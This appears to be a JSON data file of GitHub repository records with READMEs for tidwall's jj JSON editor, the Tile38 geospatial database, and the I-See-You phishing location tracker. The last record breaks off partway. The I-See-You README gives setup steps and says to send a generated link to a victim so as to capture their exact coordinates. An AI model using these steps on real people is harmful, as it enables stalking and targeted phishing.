{"tags": ["commandline"], "owner": "tidwall", "description": "JSON Stream Editor (command line utility)", "name": "jj", "topics_string": "json utility commandline", "language": "Go", "readme": "\"<p align=\\\"center\\\">\\n<img \\n src=\\\"logo.png\\\" \\n width=\\\"108\\\" height=\\\"78\\\" border=\\\"0\\\" alt=\\\"JJ\\\">\\n<br>\\nJSON Stream Editor\\n</p>\\n\\nJJ is a command line utility that provides a [fast](#performance) and simple way to retrieve or update values from JSON documents.\\nIt's powered by [GJSON](https://github.com/tidwall/gjson) and [SJSON](https://github.com/tidwall/sjson) under the hood. \\n\\nIt's [fast](#performance) because it avoids parsing irrelevant sections of json, skipping over values that do not apply, and aborts as soon as the target value has been found or updated.\\n\\nGetting started\\n---------------\\n\\n## Install\\n\\n### Mac (Homebrew)\\n\\n```\\nbrew install tidwall/jj/jj\\n```\\n\\n### Build\\n\\n```\\nmake\\n```\\n\\nOr [download a pre-built binary](https://github.com/tidwall/jj/releases) for Linux, OSX, Windows, or FreeBSD.\\n\\n\\n### Usage\\n\\n```\\n$ jj -h\\n\\nusage: jj [-v value] [-purOD] [-i infile] [-o outfile] keypath\\n\\nexamples: jj keypath read value from stdin\\n or: jj -i infile keypath read value from infile\\n or: jj -v value keypath edit value\\n or: jj -v value -o outfile keypath edit value and write to outfile\\n\\noptions:\\n -v value Edit JSON key path value\\n -p Make json pretty, keypath is optional\\n -u Make json ugly, keypath is optional\\n -r Use raw values, otherwise types are auto-detected\\n -n Do not output color or extra formatting\\n -O Performance boost for value updates\\n -D Delete the value at the specified key path\\n -l Output array values on multiple lines\\n -i infile Use input file instead of stdin\\n -o outfile Use output file instead of stdout\\n keypath JSON key path (like \\\"name.last\\\")\\n```\\n\\n\\nExamples\\n--------\\n\\n### Getting a value \\n\\nJJ uses a [path syntax](https://github.com/tidwall/gjson#path-syntax) for finding values. \\n\\nGet a string:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj name.last\\nSmith\\n```\\n\\nGet a block of JSON:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj name\\n{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}\\n```\\n\\nTry to get a non-existent key:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj name.middle\\nnull\\n```\\n\\nGet the raw string value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -r name.last\\n\\\"Smith\\\"\\n```\\n\\nGet an array value by index:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj friends.1\\nJane\\n```\\n\\n## JSON Lines\\n\\nThere's support for [JSON Lines](http://jsonlines.org/) using the `..` path prefix.\\nWhich when specified, treats the multi-lined document as an array. \\n\\nFor example:\\n\\n```\\n{\\\"name\\\": \\\"Gilbert\\\", \\\"age\\\": 61}\\n{\\\"name\\\": \\\"Alexa\\\", \\\"age\\\": 34}\\n{\\\"name\\\": \\\"May\\\", \\\"age\\\": 57}\\n```\\n\\n```\\n..# >> 4\\n..1 >> {\\\"name\\\": \\\"Alexa\\\", \\\"age\\\": 34}\\n..#.name >> [\\\"Gilbert\\\",\\\"Alexa\\\",\\\"May\\\"]\\n..#[name=\\\"May\\\"].age >> 57\\n```\\n\\n### Setting a value\\n\\nThe [path syntax](https://github.com/tidwall/sjson#path-syntax) for setting values has a couple of tiny differences than for getting values.\\n\\nThe `-v value` option is auto-detected as a Number, Boolean, Null, or String. \\nYou can override the auto-detection and input raw JSON by including the `-r` option.\\nThis is useful for raw JSON blocks such as object, arrays, or premarshalled strings.\\n\\nUpdate a value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v Andy name.first\\n{\\\"name\\\":{\\\"first\\\":\\\"Andy\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nSet a new value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v 46 age\\n{\\\"age\\\":46,\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nSet a new nested value:\\n```sh\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v relax task.today\\n{\\\"task\\\":{\\\"today\\\":\\\"relax\\\"},\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nReplace an array value by index:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj -v Andy friends.1\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\",\\\"Carol\\\"]}\\n```\\n\\nAppend an array:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj -v Andy friends.-1\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\",\\\"Carol\\\",\\\"Andy\\\"]}\\n```\\n\\nSet an array value that's past the bounds:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Tom\\\",\\\"Jane\\\",\\\"Carol\\\"]}' | jj -v Andy friends.5\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\",\\\"Carol\\\",null,null,\\\"Andy\\\"]}\\n```\\n\\nSet a raw block of JSON:\\n```sh\\n$ echo '{\\\"name\\\":\\\"Carol\\\"}' | jj -r -v '[\\\"Tom\\\",\\\"Andy\\\"]' friends\\n{\\\"friends\\\":[\\\"Tom\\\",\\\"Andy\\\"],\\\"name\\\":\\\"Carol\\\"}\\n```\\n\\nStart new JSON document:\\n```sh\\n$ echo '' | jj -v 'Sam' name.first\\n{\\\"name\\\":{\\\"first\\\":\\\"Sam\\\"}}\\n```\\n\\n### Deleting a value\\n\\nDelete a value:\\n```sh\\n$ echo '{\\\"age\\\":46,\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -D age\\n{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}\\n```\\n\\nDelete an array value by index:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Andy\\\",\\\"Carol\\\"]}' | jj -D friends.0\\n{\\\"friends\\\":[\\\"Carol\\\"]}\\n```\\n\\nDelete last item in array:\\n```sh\\n$ echo '{\\\"friends\\\":[\\\"Andy\\\",\\\"Carol\\\"]}' | jj -D friends.-1\\n{\\\"friends\\\":[\\\"Andy\\\"]}\\n```\\n\\n### Optimistically update a value\\n\\nThe `-O` option can be used when the caller expects that a value at the\\nspecified keypath already exists.\\n\\nUsing this option can speed up an operation by as much as 6x, but\\nslow down as much as 20% when the value does not exist.\\n\\nFor example:\\n\\n```\\necho '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -v Tim -O name.first\\n```\\n\\nThe `-O` tells jj that the `name.first` likely exists so try a fasttrack operation first.\\n\\n## Pretty printing\\n\\nThe `-p` flag will make the output json pretty.\\n\\n```\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -p name\\n{\\n \\\"first\\\": \\\"Tom\\\",\\n \\\"last\\\": \\\"Smith\\\"\\n}\\n```\\n\\nAlso the keypath is optional when the `-p` flag is specified, allowing for the entire json document to be made pretty.\\n\\n```\\n$ echo '{\\\"name\\\":{\\\"first\\\":\\\"Tom\\\",\\\"last\\\":\\\"Smith\\\"}}' | jj -p\\n{\\n \\\"name\\\": {\\n \\\"first\\\": \\\"Tom\\\",\\n \\\"last\\\": \\\"Smith\\\"\\n }\\n}\\n```\\n\\n## Ugly printing\\n\\nThe `-u` flag will compress the json into the fewest characters possible by squashing newlines and spaces.\\n\\n\\n## Performance\\n\\nA quick comparison of jj to [jq](https://stedolan.github.io/jq/). The test [json file](https://github.com/tidwall/sf-city-lots-json) is 180MB file of 206,560 city parcels in San Francisco.\\n\\n*Tested on a 2015 Macbook Pro running jq 1.5 and jj 1.0.0*\\n\\n#### Get the lot number for the parcel at index 10000\\n\\njq:\\n\\n```bash\\n$ time cat citylots.json | jq -cM .features[10000].properties.LOT_NUM\\n\\\"091\\\"\\n\\nreal 0m5.486s\\nuser 0m4.870s\\nsys 0m0.686s\\n```\\n\\njj:\\n\\n```bash\\n$ time cat citylots.json | jj -r features.10000.properties.LOT_NUM\\n\\\"091\\\"\\n\\nreal 0m0.354s\\nuser 0m0.161s\\nsys 0m0.321s\\n```\\n\\n#### Update the lot number for the parcel at index 10000\\n\\njq:\\n\\n```bash\\n$ time cat citylots.json | jq -cM '.features[10000].properties.LOT_NUM=\\\"12A\\\"' > /dev/null\\n\\nreal 0m13.579s\\nuser 0m16.484s\\nsys 0m1.310s\\n```\\n\\njj:\\n\\n```bash\\n$ time cat citylots.json | jj -O -v 12A features.10000.properties.LOT_NUM > /dev/null\\n\\nreal 0m0.431s\\nuser\\t0m0.201s\\nsys 0m0.295s\\n```\\n\\n## Contact\\nJosh Baker [@tidwall](http://twitter.com/tidwall)\\n\\n## License\\nJJ source code is available under the MIT [License](/LICENSE).\\n\\n\\n\\n\"", "topics": ["json", "utility"], "writeup": "A nifty command line tool for querying JSON data. Written in Golang so super easy to set up and use. Runs on an underlying library tidwall/gjson which is useful.\n", "ignoredescription": false, "id": 47, "full_name": "tidwall/jj", "url": "https://github.com/tidwall/jj"},
{"tags": [], "owner": "tidwall", "description": "Real-time Geospatial and Geofencing", "name": "tile38", "topics_string": "database geo geofence geojson geolocation geospatial gis spatial", "language": "Go", "readme": "\"<p align=\\\"center\\\">\\n <a href=\\\"https://tile38.com\\\"><img \\n src=\\\"/.github/images/logo.png\\\" \\n width=\\\"284\\\" height=\\\"108\\\" border=\\\"0\\\" alt=\\\"Tile38\\\"></a>\\n</p>\\n<p align=\\\"center\\\">\\n<a href=\\\"https://tile38.com/slack\\\"><img src=\\\"https://img.shields.io/badge/slack-channel-orange.svg\\\" alt=\\\"Slack Channel\\\"></a>\\n<a href=\\\"https://travis-ci.org/tidwall/tile38\\\"><img src=\\\"https://travis-ci.org/tidwall/tile38.svg?branch=master\\\" alt=\\\"Build Status\\\"></a>\\n<a href=\\\"https://hub.docker.com/r/tile38/tile38\\\"><img src=\\\"https://img.shields.io/badge/docker-ready-blue.svg\\\" alt=\\\"Docker Ready\\\"></a>\\n</p>\\n\\nTile38 is an open source (MIT licensed), in-memory geolocation data store, spatial index, and realtime geofence. It supports a variety of object types including lat/lon points, bounding boxes, XYZ tiles, Geohashes, and GeoJSON. \\n\\n<p align=\\\"center\\\">\\n<i>This README is quick start document. You can find detailed documentation at <a href=\\\"https://tile38.com\\\">https://tile38.com</a>.</i><br><br>\\n<a href=\\\"#searching\\\"><img src=\\\"/.github/images/search-nearby.png\\\" alt=\\\"Nearby\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"#searching\\\"><img src=\\\"/.github/images/search-within.png\\\" alt=\\\"Within\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"#searching\\\"><img src=\\\"/.github/images/search-intersects.png\\\" alt=\\\"Intersects\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"https://tile38.com/topics/geofencing\\\"><img src=\\\"/.github/images/geofence.gif\\\" alt=\\\"Geofencing\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n<a href=\\\"https://tile38.com/topics/roaming-geofences\\\"><img src=\\\"/.github/images/roaming.gif\\\" alt=\\\"Roaming Geofences\\\" border=\\\"0\\\" width=\\\"120\\\" height=\\\"120\\\"></a>\\n</p>\\n\\n## Features\\n\\n- Spatial index with [search](#searching) methods such as Nearby, Within, and Intersects.\\n- Realtime [geofencing](#geofencing) through [webhooks](https://tile38.com/commands/sethook) or [pub/sub channels](#pubsub-channels).\\n- Object types of [lat/lon](#latlon-point), [bbox](#bounding-box), [Geohash](#geohash), [GeoJSON](#geojson), [QuadKey](#quadkey), and [XYZ tile](#xyz-tile).\\n- Support for lots of [Clients Libraries](#client-libraries) written in many different languages.\\n- Variety of protocols, including [http](#http) (curl), [websockets](#websockets), [telnet](#telnet), and the [Redis RESP](https://redis.io/topics/protocol).\\n- Server responses are [RESP](https://redis.io/topics/protocol) or [JSON](https://www.json.org).\\n- Full [command line interface](#cli).\\n- Leader / follower [replication](#replication).\\n- In-memory database that persists on disk.\\n\\n## Components\\n- `tile38-server ` - The server\\n- `tile38-cli ` - Command line interface tool\\n- `tile38-benchmark ` - Server benchmark tool\\n\\n## Getting Started\\n\\n### Getting Tile38\\n\\nPerhaps the easiest way to get the latest Tile38 is to use one of the pre-built release binaries which are available for OSX, Linux, FreeBSD, and Windows. Instructions for using these binaries are on the GitHub [releases page](https://github.com/tidwall/tile38/releases).\\n\\n### Docker \\n\\nTo run the latest stable version of Tile38:\\n\\n```\\ndocker pull tile38/tile38\\ndocker run -p 9851:9851 tile38/tile38\\n```\\n\\nVisit the [Tile38 hub page](https://hub.docker.com/r/tile38/tile38/) for more information.\\n\\n### Homebrew (macOS)\\n\\nInstall Tile38 using [Homebrew](https://brew.sh/)\\n\\n```sh\\nbrew install tile38\\ntile38-server\\n```\\n\\n### Building Tile38 \\n\\nTile38 can be compiled and used on Linux, OSX, Windows, FreeBSD, and probably others since the codebase is 100% Go. We support both 32 bit and 64 bit systems. [Go](https://golang.org/dl/) must be installed on the build machine.\\n\\nTo build everything simply:\\n```\\n$ make\\n```\\n\\nTo test:\\n```\\n$ make test\\n```\\n\\n### Running \\nFor command line options invoke:\\n```\\n$ ./tile38-server -h\\n```\\n\\nTo run a single server:\\n\\n```\\n$ ./tile38-server\\n\\n# The tile38 shell connects to localhost:9851\\n$ ./tile38-cli\\n> help\\n```\\n\\n## <a name=\\\"cli\\\"></a>Playing with Tile38\\n\\nBasic operations:\\n```\\n$ ./tile38-cli\\n\\n# add a couple of points named 'truck1' and 'truck2' to a collection named 'fleet'.\\n> set fleet truck1 point 33.5123 -112.2693 # on the Loop 101 in Phoenix\\n> set fleet truck2 point 33.4626 -112.1695 # on the I-10 in Phoenix\\n\\n# search the 'fleet' collection.\\n> scan fleet # returns both trucks in 'fleet'\\n> nearby fleet point 33.462 -112.268 6000 # search 6 kilometers around a point. returns one truck.\\n\\n# key value operations\\n> get fleet truck1 # returns 'truck1'\\n> del fleet truck2 # deletes 'truck2'\\n> drop fleet # removes all \\n```\\n\\nTile38 has a ton of [great commands](https://tile38.com/commands).\\n\\n## Fields\\nFields are extra data that belongs to an object. A field is always a double precision floating point. There is no limit to the number of fields that an object can have. \\n\\nTo set a field when setting an object:\\n```\\n> set fleet truck1 field speed 90 point 33.5123 -112.2693 \\n> set fleet truck1 field speed 90 field age 21 point 33.5123 -112.2693\\n```\\n\\nTo set a field when an object already exists:\\n```\\n> fset fleet truck1 speed 90\\n```\\n\\n## Searching\\n\\nTile38 has support to search for objects and points that are within or intersects other objects. All object types can be searched including Polygons, MultiPolygons, GeometryCollections, etc.\\n\\n<img src=\\\"/.github/images/search-within.png\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Search Within\\\" align=\\\"left\\\">\\n\\n#### Within \\nWITHIN searches a collection for objects that are fully contained inside a specified bounding area.\\n<BR CLEAR=\\\"ALL\\\">\\n\\n<img src=\\\"/.github/images/search-intersects.png\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Search Intersects\\\" align=\\\"left\\\">\\n\\n#### Intersects\\nINTERSECTS searches a collection for objects that intersect a specified bounding area.\\n<BR CLEAR=\\\"ALL\\\">\\n\\n<img src=\\\"/.github/images/search-nearby.png\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Search Nearby\\\" align=\\\"left\\\">\\n\\n#### Nearby\\nNEARBY searches a collection for objects that intersect a specified radius.\\n<BR CLEAR=\\\"ALL\\\">\\n\\n### Search options\\n**SPARSE** - This option will distribute the results of a search evenly across the requested area. \\nThis is very helpful for example; when you have many (perhaps millions) of objects and do not want them all clustered together on a map. Sparse will limit the number of objects returned and provide them evenly distributed so that your map looks clean.<br><br>\\nYou can choose a value between 1 and 8. The value 1 will result in no more than 4 items. The value 8 will result in no more than 65536. *1=4, 2=16, 3=64, 4=256, 5=1024, 6=4098, 7=16384, 8=65536.*<br><br>\\n<table>\\n<td>No Sparsing<img src=\\\"/.github/images/sparse-none.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 1<img src=\\\"/.github/images/sparse-1.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 2<img src=\\\"/.github/images/sparse-2.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 3<img src=\\\"/.github/images/sparse-3.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 4<img src=\\\"/.github/images/sparse-4.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n<td>Sparse 5<img src=\\\"/.github/images/sparse-5.png\\\" width=\\\"100\\\" height=\\\"100\\\" border=\\\"0\\\" alt=\\\"Search Within\\\"></td>\\n</table>\\n\\n*Please note that the higher the sparse value, the slower the performance. Also, LIMIT and CURSOR are not available when using SPARSE.* \\n\\n**WHERE** - This option allows for filtering out results based on [field](#fields) values. For example<br>```nearby fleet where speed 70 +inf point 33.462 -112.268 6000``` will return only the objects in the 'fleet' collection that are within the 6 km radius **and** have a field named `speed` that is greater than `70`. <br><br>Multiple WHEREs are concatenated as **and** clauses. ```WHERE speed 70 +inf WHERE age -inf 24``` would be interpreted as *speed is over 70 <b>and</b> age is less than 24.*<br><br>The default value for a field is always `0`. Thus if you do a WHERE on the field `speed` and an object does not have that field set, the server will pretend that the object does and that the value is Zero.\\n\\n**MATCH** - MATCH is similar to WHERE except that it works on the object id instead of fields.<br>```nearby fleet match truck* point 33.462 -112.268 6000``` will return only the objects in the 'fleet' collection that are within the 6 km radius **and** have an object id that starts with `truck`. There can be multiple MATCH options in a single search. The MATCH value is a simple [glob pattern](https://en.wikipedia.org/wiki/Glob_(programming)).\\n\\n**CURSOR** - CURSOR is used to iterate though many objects from the search results. An iteration begins when the CURSOR is set to Zero or not included with the request, and completes when the cursor returned by the server is Zero.\\n\\n**NOFIELDS** - NOFIELDS tells the server that you do not want field values returned with the search results.\\n\\n**LIMIT** - LIMIT can be used to limit the number of objects returned for a single search request.\\n\\n\\n## Geofencing\\n\\n<img src=\\\"/.github/images/geofence.gif\\\" width=\\\"200\\\" height=\\\"200\\\" border=\\\"0\\\" alt=\\\"Geofence animation\\\" align=\\\"left\\\">\\nA <a href=\\\"https://en.wikipedia.org/wiki/Geo-fence\\\">geofence</a> is a virtual boundary that can detect when an object enters or exits the area. This boundary can be a radius, bounding box, or a polygon. Tile38 can turn any standard search into a geofence monitor by adding the FENCE keyword to the search. \\n\\n*Tile38 also allows for [Webhooks](https://tile38.com/commands/sethook) to be assigned to Geofences.*\\n\\n<br clear=\\\"all\\\">\\n\\nA simple example:\\n```\\n> nearby fleet fence point 33.462 -112.268 6000\\n```\\nThis command opens a geofence that monitors the 'fleet' collection. The server will respond with:\\n```\\n{\\\"ok\\\":true,\\\"live\\\":true}\\n```\\nAnd the connection will be kept open. If any object enters or exits the 6 km radius around `33.462,-112.268` the server will respond in realtime with a message such as:\\n\\n```\\n{\\\"command\\\":\\\"set\\\",\\\"detect\\\":\\\"enter\\\",\\\"id\\\":\\\"truck02\\\",\\\"object\\\":{\\\"type\\\":\\\"Point\\\",\\\"coordinates\\\":[-112.2695,33.4626]}}\\n```\\n\\nThe server will notify the client if the `command` is `del | set | drop`. \\n\\n- `del` notifies the client that an object has been deleted from the collection that is being fenced.\\n- `drop` notifies the client that the entire collection is dropped.\\n- `set` notifies the client that an object has been added or updated, and when it's position is detected by the fence.\\n\\nThe `detect` may be one of the following values.\\n\\n- `inside` is when an object is inside the specified area.\\n- `outside` is when an object is outside the specified area.\\n- `enter` is when an object that **was not** previously in the fence has entered the area.\\n- `exit` is when an object that **was** previously in the fence has exited the area.\\n- `cross` is when an object that **was not** previously in the fence has entered **and** exited the area.\\n\\nThese can be used when establishing a geofence, to pre-filter responses. For instance, to limit responses to `enter` and `exit` detections:\\n\\n```\\n> nearby fleet fence detect enter,exit point 33.462 -112.268 6000\\n```\\n\\n### Pub/sub channels\\n\\nTile38 supports delivering geofence notications over pub/sub channels. \\n\\nTo create a static geofence that sends notifications when a bus is within 200 meters of a point and sends to the `busstop` channel:\\n\\n```\\n> setchan busstop nearby buses fence point 33.5123 -112.2693 200\\n```\\n\\nSubscribe on the `busstop` channel:\\n\\n```\\n> subscribe busstop\\n```\\n\\n## Object types\\n\\nAll object types except for XYZ Tiles and QuadKeys can be stored in a collection. XYZ Tiles and QuadKeys are reserved for the SEARCH keyword only.\\n\\n#### Lat/lon point\\nThe most basic object type is a point that is composed of a latitude and a longitude. There is an optional `z` member that may be used for auxiliary data such as elevation or a timestamp.\\n```\\nset fleet truck1 point 33.5123 -112.2693 # plain lat/lon\\nset fleet truck1 point 33.5123 -112.2693 225 # lat/lon with z member\\n```\\n\\n#### Bounding box\\nA bounding box consists of two points. The first being the southwestern most point and the second is the northeastern most point.\\n```\\nset fleet truck1 bounds 30 -110 40 -100\\n```\\n#### Geohash\\nA [geohash](https://en.wikipedia.org/wiki/Geohash) is a string representation of a point. With the length of the string indicating the precision of the point. \\n```\\nset fleet truck1 hash 9tbnthxzr # this would be equivalent to 'point 33.5123 -112.2693'\\n```\\n\\n#### GeoJSON\\n[GeoJSON](https://tools.ietf.org/html/rfc7946) is an industry standard format for representing a variety of object types including a point, multipoint, linestring, multilinestring, polygon, multipolygon, geometrycollection, feature, and featurecollection.\\n\\n<i>* All ignored members will not persist.</i>\\n\\n**Important to note that all coordinates are in Longitude, Latitude order.**\\n\\n```\\nset city tempe object {\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[0,0],[10,10],[10,0],[0,0]]]}\\n```\\n\\n#### XYZ Tile\\nAn XYZ tile is rectangle bounding area on earth that is represented by an X, Y coordinate and a Z (zoom) level.\\nCheck out [maptiler.org](http://www.maptiler.org/google-maps-coordinates-tile-bounds-projection/) for an interactive example.\\n\\n#### QuadKey\\nA QuadKey used the same coordinate system as an XYZ tile except that the string representation is a string characters composed of 0, 1, 2, or 3. For a detailed explanation checkout [The Bing Maps Tile System](https://msdn.microsoft.com/en-us/library/bb259689.aspx).\\n\\n\\n## Network protocols\\n\\nIt's recommended to use a [client library](#client-libraries) or the [Tile38 CLI](#running), but there are times when only HTTP is available or when you need to test from a remote terminal. In those cases we provide an HTTP and telnet options.\\n\\n#### HTTP\\nOne of the simplest ways to call a tile38 command is to use HTTP. From the command line you can use [curl](https://curl.haxx.se/). For example:\\n\\n```\\n# call with request in the body\\ncurl --data \\\"set fleet truck3 point 33.4762 -112.10923\\\" localhost:9851\\n\\n# call with request in the url path\\ncurl localhost:9851/set+fleet+truck3+point+33.4762+-112.10923\\n```\\n\\n#### Websockets\\nWebsockets can be used when you need to Geofence and keep the connection alive. It works just like the HTTP example above, with the exception that the connection stays alive and the data is sent from the server as text websocket messages.\\n\\n#### Telnet\\nThere is the option to use a plain telnet connection. The default output through telnet is [RESP](https://redis.io/topics/protocol).\\n\\n```\\ntelnet localhost 9851\\nset fleet truck3 point 33.4762 -112.10923\\n+OK\\n\\n```\\n\\nThe server will respond in [JSON](https://json.org) or [RESP](https://redis.io/topics/protocol) depending on which protocol is used when initiating the first command.\\n\\n- HTTP and Websockets use JSON. \\n- Telnet and RESP clients use RESP.\\n\\n## Client Libraries\\n\\nTile38 uses the [Redis RESP](https://redis.io/topics/protocol) protocol natively. Therefore most clients that support basic Redis commands will in turn support Tile38. Below are a few of the popular clients. \\n\\n- C: [hiredis](https://github.com/redis/hiredis)\\n- C#: [StackExchange.Redis](https://github.com/StackExchange/StackExchange.Redis)\\n- C++: [redox](https://github.com/hmartiro/redox)\\n- Clojure: [carmine](https://github.com/ptaoussanis/carmine)\\n- Common Lisp: [CL-Redis](https://github.com/vseloved/cl-redis)\\n- Erlang: [Eredis](https://github.com/wooga/eredis)\\n- Go: [go-redis](https://github.com/go-redis/redis) ([example code](https://github.com/tidwall/tile38/wiki/Go-example-(go-redis)))\\n- Go: [redigo](https://github.com/gomodule/redigo) ([example code](https://github.com/tidwall/tile38/wiki/Go-example-(redigo)))\\n- Haskell: [hedis](https://github.com/informatikr/hedis)\\n- Java: [lettuce](https://github.com/mp911de/lettuce) ([example code](https://github.com/tidwall/tile38/wiki/Java-example-(lettuce)))\\n- Node.js: [node-tile38](https://github.com/phulst/node-tile38) ([example code](https://github.com/tidwall/tile38/wiki/Node.js-example-(node-tile38)))\\n- Node.js: [node_redis](https://github.com/NodeRedis/node_redis) ([example code](https://github.com/tidwall/tile38/wiki/Node.js-example-(node-redis)))\\n- Perl: [perl-redis](https://github.com/PerlRedis/perl-redis)\\n- PHP: [tinyredisclient](https://github.com/ptrofimov/tinyredisclient) ([example code](https://github.com/tidwall/tile38/wiki/PHP-example-(tinyredisclient)))\\n- PHP: [phpredis](https://github.com/phpredis/phpredis)\\n- Python: [redis-py](https://github.com/andymccurdy/redis-py) ([example code](https://github.com/tidwall/tile38/wiki/Python-example))\\n- Ruby: [redic](https://github.com/amakawa/redic) ([example code](https://github.com/tidwall/tile38/wiki/Ruby-example-(redic)))\\n- Ruby: [redis-rb](https://github.com/redis/redis-rb) ([example code](https://github.com/tidwall/tile38/wiki/Ruby-example-(redis-rb)))\\n- Rust: [redis-rs](https://github.com/mitsuhiko/redis-rs)\\n- Scala: [scala-redis](https://github.com/debasishg/scala-redis)\\n- Swift: [Redbird](https://github.com/czechboy0/Redbird)\\n\\n## Contact\\n\\nJosh Baker [@tidwall](https://twitter.com/tidwall)\\n\\n## License\\n\\nTile38 source code is available under the MIT [License](/LICENSE).\\n\"", "topics": ["database", "geo", "geofence", "geojson", "geolocation", "geospatial", "gis", "spatial"], "writeup": "Tile38 is an open source (MIT licensed), in-memory geolocation data store, spatial index, and realtime geofence. It supports a variety of object types including lat/lon points, bounding boxes, XYZ tiles, Geohashes, and GeoJSON. \n", "ignoredescription": true, "id": 48, "full_name": "tidwall/tile38", "url": "https://github.com/tidwall/tile38"},
{"tags": [], "owner": "Viralmaniar", "description": "ISeeYou is a Bash and Javascript tool to find the exact location of the users during social engineering or phishing engagements. Using exact location coordinates an attacker can perform preliminary reconnaissance which will help them in performing further targeted attacks.", "name": "I-See-You", "topics_string": "bash-scripting geolocation geotargeting location-tracker location-tracking osint osint-reconnaissance osinttool phishing phishing-attacks phishing-engagements phishing-kit reconnaissance redteam redteaming socialengineering", "language": "Shell", "readme": "\"# I-See-You\\n\\nISeeYou is a Bash and Javascript tool to find the exact location of the users during social engineering or phishing engagements. Using exact location coordinates an attacker can perform preliminary reconnaissance which will help them in performing further targeted attacks. \\n\\n<B>Note:</B><Br>\\n- This tool does not require any additional software to perform phishing attacks.\\n- Users can expose their local servers to the Internet and decode the location coordinates by looking at the log file.\\n \\n<B><I>This project must not be used for illegal purposes for stalking people or hacking into system where you do not have permission, it is strictly for educational purposes and for people to experiment with.</I></B>\\n \\nAny suggestions or ideas for this tool are welcome - just tweet me on [@ManiarViral](https://twitter.com/maniarviral)\\n\\n![image](https://user-images.githubusercontent.com/3501170/55272562-2d894b80-5312-11e9-8fec-0be64a00c317.png)\\n\\n# How to install?\\n\\n<pre>\\ngit clone https://github.com/Viralmaniar/I-See-You.git\\ncd I-See-You\\nchmod u+x ISeeYou.sh\\n./ISeeYou.sh\\n</pre>\\n![image](https://user-images.githubusercontent.com/3501170/55271795-e9447e00-5306-11e9-8a52-30251d1fc156.png)\\n\\n# Screenshots\\n\\nOnce the `ISeeYou.sh` is ran user sees the below screen:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271919-00846b00-5309-11e9-8002-1007022ed323.png)\\n\\nEnter the highlighted url on the main screen where it asks for `Enter the URL generated by Serveo` and hit `Enter`:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271934-3aee0800-5309-11e9-86bc-6cd1c843e635.png)\\n\\nThis URL is generated randomly for different users. However, it will be a subdomain for the serveo.net domain. Send this URL to your victim as part of the phishing campaign via email or any other medium. Victim will see the site as below:\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271752-34aa5c80-5306-11e9-87b2-fa4f54321fe3.png)\\n\\nNote: You can be creative and modify the look and feel of the page as per your requirement.\\n\\nOnce the targeted users allows location permission, malicious user will receive exact location of the victim in the tail screen. These numbers are `longitude and latitude` of the user.\\n\\n![image](https://user-images.githubusercontent.com/3501170/55271965-cbc4e380-5309-11e9-8dca-5a1f5933c1c7.png)\\n\\nUsing `https://maps.google.com` you can convert the `longitude and latitude` to an exact 